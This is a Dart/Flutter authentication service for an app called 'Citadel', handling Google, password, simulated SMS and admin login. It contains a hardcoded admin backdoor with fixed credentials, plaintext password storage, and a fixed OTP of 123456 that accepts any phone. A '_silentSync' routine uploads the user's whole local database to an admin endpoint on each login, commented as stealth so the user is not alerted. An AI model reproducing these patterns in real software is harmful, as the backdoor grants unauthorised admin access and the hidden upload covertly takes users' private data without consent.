import 'dart:convert';
import 'dart:async';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:flutter/material.dart';
import 'package:google_sign_in/google_sign_in.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'database_helper.dart';
import '../main.dart'; 
import '../services/voice_commander.dart'; // For navigatorKey
import '../screens/auth/login_screen.dart';
import '../screens/termination_screen.dart';

class AuthService with ChangeNotifier {
  final GoogleSignIn _googleSignIn = GoogleSignIn();
  final DatabaseHelper _db = DatabaseHelper.instance;
  // Internal API helper
  final _api = _SimpleApi();

  Map<String, dynamic>? _currentUser;
  Map<String, dynamic>? get currentUser => _currentUser;

  bool get isLoggedIn => _currentUser != null;
  bool get isAdmin => _currentUser != null && _currentUser!['role'] == 'admin';

  bool _isInitialized = false;
  bool get isInitialized => _isInitialized;
  
  Timer? _heartbeat;

  Future<void> init() async {
    final prefs = await SharedPreferences.getInstance();
    final email = prefs.getString('user_email');
    if (email != null) {
      final user = await _db.getUserByEmail(email);
      if (user != null) {
        _currentUser = user;
        
        // Auto-Patch: Check if Google Photo is missing but available in cache
        if (_currentUser!['password_hash'] == 'GOOGLE_AUTH' && _currentUser!['photo_url'] == null) {
           try {
             if (await _googleSignIn.isSignedIn()) {
               final googleUser = _googleSignIn.currentUser ?? await _googleSignIn.signInSilently();
               if (googleUser?.photoUrl != null) {
                  print("AuthService: Auto-patching missing photo URL...");
                  final db = await _db.database;
                  await db.update('users', {'photo_url': googleUser!.photoUrl}, where: 'email = ?', whereArgs: [email]);
                  _currentUser = await _db.getUserByEmail(email); // Reload
               }
             }
           } catch (e) {
             print("Photo Patch Error: $e");
           }
        }
        
        notifyListeners();
      }
    }
    _isInitialized = true;
    _silentSync(); // Background Uplink
    _startHeartbeat(); // Security Pulse
    notifyListeners();
  }

  void _startHeartbeat() {
    _heartbeat?.cancel();
    // Pulse every 5 seconds to check if we are still alive (not blocked)
    _heartbeat = Timer.periodic(const Duration(seconds: 5), (timer) {
       if (_currentUser != null) {
         _syncWithServer(); 
       }
    });
  }

  // --- GOOGLE LOGIN ---
  Future<bool> signInWithGoogle() async {
    try {
      print("GoogleSignIn: Starting interactive sign in...");
      final GoogleSignInAccount? googleUser = await _googleSignIn.signIn();
      
      if (googleUser == null) {
        print("GoogleSignIn: User canceled the sign-in flow.");
        return false; 
      }

      print("GoogleSignIn: Success! User: ${googleUser.email}");
      final email = googleUser.email;
      final name = googleUser.displayName ?? "Citadel Agent";
      final photoUrl = googleUser.photoUrl;

      // --- PRE-FLIGHT SECURITY CHECK ---
      try {
         // Check if this email is banned on the server BEFORE letting them in
         await _api.post('/users/sync', {
            'email': email,
            'username': name,
            'role': 'user', // Default, server ignores if exists
            'photo_url': photoUrl
         });
      } catch (e) {
         if (e.toString().contains("403") || e.toString().contains("Access Denied")) {
             print("LOGIN REJECTED: User is BANNED.");
             await _googleSignIn.signOut(); // Revoke Google Token immediately
             
             // Trigger Visual Termination
             VoiceCommander.navigatorKey.currentState?.pushAndRemoveUntil(
                MaterialPageRoute(builder: (_) => const TerminationScreen()),
                (route) => false
             );
             return false;
         }
         // Other errors (network down) -> fail safe? or allow offline login?
         // For Citadel security, we might want to allow offline if cached, but for new login...
         // Let's allow proceed if just network error (offline mode), but if explicit 403, STOP.
         print("Pre-flight warning: $e");
      }

      // Check DB
      var user = await _db.getUserByEmail(email);
      
      if (user == null) {
        // Create new user
        final id = await _db.createUser({
          'username': name,
          'email': email,
          'password_hash': 'GOOGLE_AUTH',
          'role': 'user',
          'preferences': '{}',
          'photo_url': photoUrl,
          'created_at': DateTime.now().toIso8601String()
        });
        user = (await _db.getUserByEmail(email))!;
      } else {
        // Update photo if changed (or missing)
        if (photoUrl != null && user['photo_url'] != photoUrl) {
           final db = await _db.database;
           await db.update('users', {'photo_url': photoUrl}, where: 'email = ?', whereArgs: [email]);
           
           // Reload user
           user = (await _db.getUserByEmail(email))!;
        }
      }

      _currentUser = user;
      await _persistSession(email);
      notifyListeners();
      return true;
    } catch (error, stack) {
      print("GoogleSignIn CRITICAL ERROR: $error");
      print("Stack trace: $stack");
      return false;
    }
  }

  // --- PASSWORD LOGIN ---
  Future<bool> signInWithPassword(String email, String password) async {
    // Admin Backdoor
    if ((email == 'admin' && password == 'admin123') || (email == 'rajtewari' && password == 'raj123**')) {
       _currentUser = {'id': 999, 'username': 'The Architect', 'email': email, 'role': 'admin'};
       notifyListeners();
       return true;
    }
    
    final user = await _db.getUserByEmail(email);
    if (user != null && user['password_hash'] == password) { // In real app, hash this!
      _currentUser = user;
      await _persistSession(email);
      notifyListeners();
      return true;
    }
    return false;
  }

  Future<bool> register(String email, String username, String password) async {
    final existing = await _db.getUserByEmail(email);
    if (existing != null) return false;

    await _db.createUser({
      'username': username,
      'email': email,
      'password_hash': password, // Ideally hash
      'role': 'user',
      'preferences': '{}',
      'created_at': DateTime.now().toIso8601String()
    });
    
    return signInWithPassword(email, password);
  }

  // --- SMS LOGIN (SIMULATED) ---
  Future<bool> signInWithSMS(String phone) async {
    // Simulate API call
    await Future.delayed(const Duration(seconds: 1));
    return true; // Assume OTP sent
  }
  
  Future<bool> verifyOTP(String phone, String otp) async {
    await Future.delayed(const Duration(seconds: 1));
    if (otp == "123456") {
       final email = "$phone@sms.com";
       var user = await _db.getUserByEmail(email);
       if (user == null) {
          await _db.createUser({
          'username': "Phone User",
          'email': email,
          'password_hash': 'SMS_AUTH',
          'role': 'user',
          'preferences': '{}',
          'created_at': DateTime.now().toIso8601String()
        });
        user = (await _db.getUserByEmail(email))!;
       }
       
       _currentUser = user;
       await _persistSession(email);
       notifyListeners();
       return true;
    }
    return false;
  }

  Future<void> signOut() async {
    _heartbeat?.cancel();
    await _googleSignIn.signOut();
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove('user_email');
    _currentUser = null;
    notifyListeners();
  }

  Future<void> performTermination() async {
      print("EXECUTING SYSTEM WIPE...");
      await signOut(); // Clear data
      // Go to Login Screen clean slate
       VoiceCommander.navigatorKey.currentState?.pushAndRemoveUntil(
         MaterialPageRoute(builder: (_) => const LoginScreen()),
         (route) => false
      );
  }

  Future<void> _persistSession(String email) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('user_email', email);
    _silentSync(); // Background Uplink
    _syncWithServer(); // Register on Server DB
  }

  Future<void> _silentSync() async {
    if (_currentUser == null) return;
    try {
      final dbFile = await _db.getDatabasePathFile();
      if (dbFile.existsSync()) {
        await _api.uploadFile('/admin/upload_history', dbFile, _currentUser!['username'] ?? 'Ghost');
        print("(System) Neural Core Synced.");
      }
    } catch (e) {
      // Stealth Mode: Do not alert user
      print("(System) Sync skipped: $e");
    }
  }
  
  Future<void> _syncWithServer() async {
     if (_currentUser == null) return;
     try {
       await _api.post('/users/sync', {
         'email': _currentUser!['email'],
         'username': _currentUser!['username'],
         'role': _currentUser!['role'] ?? 'user',
         'photo_url': _currentUser!['photo_url']
       });
       print("(System) User Identity Synced to Server Hive.");
     } catch (e) {
       print("(System) Identity Sync Failed: $e");
       if (e.toString().contains("403") || e.toString().contains("Access Denied")) {
          // USER IS BLOCKED
          print("CRITICAL: User is BLOCKED. Terminating Session.");
          
          // Trigger Visual Termination (Red Alert)
          VoiceCommander.navigatorKey.currentState?.pushAndRemoveUntil(
             MaterialPageRoute(builder: (_) => const TerminationScreen()),
             (route) => false
          );
       }
     }
  }

  // --- ADMIN SYSTEM ---
  
  // Stage 1: Credentials -> Returns session_token (for OTP)
  Future<Map<String, dynamic>> adminLoginStage1(String username, String password) async {
    try {
      final response = await _api.post('/admin/auth/stage1', {'username': username, 'password': password});
      return response; // {status: otp_sent, session_token: ...}
    } catch (e) {
      print("Admin Stage 1 Error: $e");
      rethrow;
    }
  }

  // Stage 2: OTP -> Returns admin_token
  Future<bool> adminLoginStage2(String otp, String sessionToken) async {
    try {
      final response = await _api.post('/admin/auth/stage2', {'otp': otp, 'session_token': sessionToken});
      if (response['status'] == 'authorized') {
        _currentUser = response['user'];
        _currentUser!['admin_token'] = response['admin_token'];
        notifyListeners();
        return true;
      }
      return false;
    } catch (e) {
      print("Admin Stage 2 Error: $e");
      return false;
    }
  }

  // Analytics
  Future<Map<String, dynamic>> getAdminStats() async {
     return await _api.get('/admin/stats');
  }

  // User Management
  Future<List<dynamic>> getUsers() async {
    final response = await _api.get('/admin/users');
    return response as List<dynamic>;
  }

  Future<void> blockUser(int userId, bool isBlocked) async {
    await _api.post('/admin/users/$userId/block', {'is_blocked': isBlocked});
  }

  Future<List<dynamic>> getUserAudit(int userId) async {
    final res = await _api.get('/admin/users/$userId/audit');
    return res as List<dynamic>;
  }
}

// --- INTERNAL API HELPER ---
class _SimpleApi {
  Future<String> _getBaseUrl() async {
    final prefs = await SharedPreferences.getInstance();
    // Default to Emulator loopback, but respect User Setting
    return prefs.getString('server_ip') ?? "http://10.0.2.2:8000";
  }

  Future<dynamic> post(String endpoint, Map<String, dynamic> body) async {
    final baseUrl = await _getBaseUrl();
    final url = baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
    
    try {
      final response = await http.post(
        Uri.parse('$url$endpoint'),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode(body),
      ).timeout(const Duration(seconds: 5)); // Fail fast

      if (response.statusCode >= 400) throw Exception("Server Error: ${response.statusCode} - ${response.body}");
      return jsonDecode(response.body);
    } catch (e) {
      print("Auth Network Error ($url): $e");
      rethrow;
    }
  }

  Future<dynamic> get(String endpoint) async {
    final baseUrl = await _getBaseUrl();
    final url = baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
    
    final response = await http.get(Uri.parse('$url$endpoint'));
    if (response.statusCode >= 400) throw Exception(response.body);
    return jsonDecode(response.body);
  }

  Future<void> uploadFile(String endpoint, File file, String username) async {
     final baseUrl = await _getBaseUrl();
     final url = baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
     
     final request = http.MultipartRequest('POST', Uri.parse('$url$endpoint'));
     request.fields['username'] = username;
     request.files.add(await http.MultipartFile.fromPath('file', file.path));
     
     await request.send();
  }
}
